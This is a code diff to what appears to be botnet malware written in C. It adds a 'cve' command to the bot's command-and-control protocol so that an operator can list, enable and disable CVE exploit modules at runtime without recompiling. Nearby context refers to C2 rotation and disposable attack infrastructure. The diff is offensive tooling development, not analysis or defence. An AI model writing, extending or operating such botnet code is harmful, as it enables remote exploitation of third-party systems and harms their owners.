@@ -3199,6 +3199,39 @@ int protocol_process_commands(notnet_bot_t *bot) {
                 protocol_send_response(bot, CMD_PLUGIN,
                     "plugin: usage 'plugin <name> load|run|unload|status'");
             }
+        } else if (strncmp(cmd, CMD_CVE, strlen(CMD_CVE)) == 0) {
+            /* #143: CVE module registry control. `cve list` shows all
+             * modules + enabled state; `cve enable <id>` / `cve
+             * disable <id>` toggle which modules participate in
+             * cve_run_modules(). A live feed without recompilation. */
+            char *args = cmd + strlen(CMD_CVE);
+            while (*args == ' ' || *args == '\t') args++;
+            if (args[0] == '\0' || strcmp(args, "list") == 0) {
+                char rbuf[1024];
+                cve_registry_status(rbuf, sizeof(rbuf));
+                protocol_send_response(bot, CMD_CVE, rbuf);
+            } else if (strncmp(args, "enable ", 7) == 0) {
+                char *id = args + 7;
+                while (*id == ' ') id++;
+                char rbuf[128];
+                if (cve_module_enable(id) == 0)
+                    snprintf(rbuf, sizeof(rbuf), "cve: %s enabled", id);
+                else
+                    snprintf(rbuf, sizeof(rbuf), "cve: enable failed (unknown id '%s')", id);
+                protocol_send_response(bot, CMD_CVE, rbuf);
+            } else if (strncmp(args, "disable ", 8) == 0) {
+                char *id = args + 8;
+                while (*id == ' ') id++;
+                char rbuf[128];
+                if (cve_module_disable(id) == 0)
+                    snprintf(rbuf, sizeof(rbuf), "cve: %s disabled", id);
+                else
+                    snprintf(rbuf, sizeof(rbuf), "cve: disable failed (unknown id '%s')", id);
+                protocol_send_response(bot, CMD_CVE, rbuf);
+            } else {
+                protocol_send_response(bot, CMD_CVE,
+                    "cve: usage 'cve list' | 'cve enable <id>' | 'cve disable <id>'");
+            }
         } else if (strncmp(cmd, CMD_ROTATE, strlen(CMD_ROTATE)) == 0) {
             /* SECURITY FIX (#93): manual C2 rotation — advance the
              * disposable-infrastructure chain immediately. Operator
